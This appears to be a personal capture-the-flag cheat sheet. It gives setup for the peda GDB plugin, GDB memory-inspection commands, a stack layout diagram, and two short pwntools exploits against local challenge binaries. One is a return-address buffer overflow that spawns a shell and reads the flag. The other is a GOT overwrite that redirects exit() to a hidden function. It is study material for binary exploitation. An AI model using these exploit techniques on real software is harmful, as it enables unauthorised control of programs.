# peda
```sh
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```
# pwntools
```python
from pwn import *

context.binary = "./pwn1"

p = process()
p.sendline(b"A" * 128 + b"a" * 12 + p32(context.binary.functions["shell"].address))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```
# GDB commands
- `r` run
- `c` continue
- `b <function_name>` breakpoint or `b <linenumber>`
- `file <file>` load file
- `x/Nuf expr`: examine memory at address expr
  - N how many units to display
  - u unit size; one of b(individual bytes), h (halfwords = 2B), w (words = 4B), g (giant words = 8B)
  - f printing format (any print format) or s (s null-terminated string) i (machine instructions)
Ex: `x/168x $sp' (4 byte chunks by default) $sp = stack pointer, $rip = instruction pointer

# Stack representation
```
+---------------+ <- SP
|     locals    |
+---------------+ <- BP
|       BP      |
+---------------+
|    ret add    |
+---------------+
```

# GOT
```python
from pwn import *  # type: ignore

context.binary = "./NeedsToBeHappy"
e: ELF = context.binary  # type: ignore     #just to make the typechecker happy
p = process()
p.sendline(b"y")
p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(e.got["exit"]).encode("ascii"))
```
The binary provides a trivial write-what-where so it would be a good idea to overwrite some entry in the GOT in order to get control of the program control flow.
A good candidate for the overwrite would be (as usual) the `exit()` function.
The function that (sort of) gives us the flag is `give_the_man_a_cat()` but it's never called anywhere.
By overwriting the GOT entry for `exit()` we can call the required function and get the flag.
